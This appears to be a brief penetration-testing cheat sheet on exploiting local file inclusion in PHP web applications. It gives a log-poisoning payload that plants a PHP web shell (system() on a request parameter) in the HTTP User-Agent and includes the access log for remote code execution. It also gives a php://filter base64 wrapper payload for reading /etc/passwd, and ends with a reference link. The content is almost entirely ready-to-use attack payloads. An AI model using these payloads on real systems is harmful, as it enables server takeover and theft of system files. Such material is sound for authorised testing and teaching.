# Log Poisoning to RCE
```m
file=/var/log/httpd-access.log
User-Agent: <?php echo system($_REQUEST['cmd']); ?>
```
Send cmd as parameter in GET or POST request

# Base64 encoded payload
```m
file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```
# References
https://www.hackingarticles.in/5-ways-exploit-lfi-vulnerability/
